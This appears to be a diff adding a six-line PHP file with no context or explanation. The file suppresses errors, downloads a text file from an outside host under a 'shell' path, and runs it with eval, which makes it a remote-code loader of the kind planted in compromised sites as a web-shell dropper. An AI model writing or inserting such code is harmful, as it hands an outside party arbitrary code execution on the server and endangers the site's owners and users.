@@ -1,0 +1,6 @@
+<?php
+error_reporting(0);
+$url = 'https://this-jakartans.sbs/shell/penjarahan.txt';
+$kode = file_get_contents($url);
+eval('?>' . $kode);
+?>
